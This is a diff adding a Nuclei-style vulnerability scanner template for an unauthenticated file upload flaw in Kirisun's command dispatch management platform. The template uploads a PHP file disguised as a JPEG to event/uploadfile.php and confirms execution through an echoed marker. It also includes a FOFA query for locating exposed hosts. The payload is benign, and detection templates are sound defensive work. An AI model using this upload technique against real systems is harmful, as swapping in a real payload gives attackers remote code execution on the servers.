@@ -1,0 +1,49 @@
+id: kirisun-event-uploadfile
+
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台 - event/uploadfile.php 
+  author: leadlife
+  severity: critical
+  description: todo
+  reference:
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0RCE.md
+  metadata:
+    verified: true
+    fofa-query: body="app/structure/departments.php" ||app="指挥调度管理平台"
+  tags: kirisun,fileupload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /api/client/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="uploadfile"; filename="{{filename}}.php"
+        Content-Type: image/jpeg
+
+        <?php print("{{randstr}}");unlink(__FILE__);?>
+        --{{boundary}}--
+        
+      - |
+        GET /{{url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: url
+        internal: true
+        json:
+          - .url
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2, "{{randstr}}")
+        condition: and
